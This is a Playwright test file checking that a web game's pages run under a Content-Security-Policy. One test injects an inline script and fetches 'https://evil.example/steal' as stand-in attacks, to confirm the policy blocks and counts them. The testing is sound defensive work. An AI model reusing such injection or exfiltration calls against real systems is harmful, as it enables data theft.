import { expect, type Page, test } from '@playwright/test';
import { cspSeen, expectNoCsp, hatch, openGame, state } from './helpers';

// M14 T16: every page runs under its Content-Security-Policy (tools/csp.mjs), sees no violation
// while it works, and blocks and counts what the policy forbids. No hub: the card asks a local
// port nothing listens on, which the policy allows and the card reports as unreachable.

/** Keeps every violation from the document's start, before any of the page's own code runs. */
async function watchFromStart(page: Page): Promise<void> {
  await page.addInitScript(() => {
    const w = window as unknown as { __early: string[] };
    w.__early = [];
    document.addEventListener('securitypolicyviolation', (e) =>
      w.__early.push(`${e.effectiveDirective} ${e.blockedURI}`),
    );
  });
}

const early = (page: Page) =>
  page.evaluate(() => (window as unknown as { __early: string[] }).__early);

const policyOf = (page: Page) =>
  page
    .locator('meta[http-equiv="Content-Security-Policy"]')
    .getAttribute('content')
    .then((c) => c ?? '');

const PAGES = [
  { name: 'the game', path: './?genome=starter', ready: () => window.__bs?.ready === true },
  {
    name: 'the Lab',
    path: './lab.html?seed=lab-e2e',
    ready: () => window.__lab?.ready === true,
  },
  {
    name: 'the card',
    path: `./card.html?c=${'ab'.repeat(32)}&hub=http://localhost:1`,
    ready: () => window.__card?.state().phase === 'error',
  },
] as const;

for (const p of PAGES) {
  test(`${p.name} carries the policy and runs under it with no violation`, async ({ page }) => {
    await watchFromStart(page);
    await page.goto(p.path);
    await page.waitForFunction(p.ready, null, { timeout: 20_000 });
    const policy = await policyOf(page);
    expect(policy).toContain("script-src 'self'");
    expect(policy).toContain("worker-src 'self'");
    expect(policy).toMatch(/connect-src 'self'[^;]* http:\/\/localhost:\*/);
    expect(policy).not.toContain('unsafe-eval');
    expect(await early(page)).toEqual([]);
    await expectNoCsp(page);
  });
}

test('the game hatches and plays under the policy', async ({ page }) => {
  await watchFromStart(page);
  await openGame(page, '?debug=1');
  await hatch(page);
  await page.waitForFunction(() => (window.__bs?.state().tick ?? 0) > 30, null, {
    timeout: 20_000,
  });
  expect(await early(page)).toEqual([]);
  expect((await state(page)).csp).toEqual([]);
});

test('what the policy forbids is blocked, counted in state().csp, and fails the helpers', async ({
  page,
}) => {
  await openGame(page, '');
  const ran = await page.evaluate(async () => {
    const w = window as unknown as { __ran?: boolean };
    // An inline script, as an injected one would be.
    const script = document.createElement('script');
    script.textContent = 'window.__ran = true';
    document.head.append(script);
    // A connection to an origin the policy doesn't name.
    await fetch('https://evil.example/steal').catch(() => null);
    return w.__ran === true;
  });
  expect(ran).toBe(false);
  await expect
    .poll(async () => (await cspSeen(page)).map((v) => (v as { directive: string }).directive), {
      message: 'the page counts both violations',
    })
    .toEqual(['script-src-elem', 'connect-src']);
  await expect(state(page)).rejects.toThrow(/Content-Security-Policy blocked/);
  await expect(expectNoCsp(page)).rejects.toThrow(/Content-Security-Policy blocked/);
});
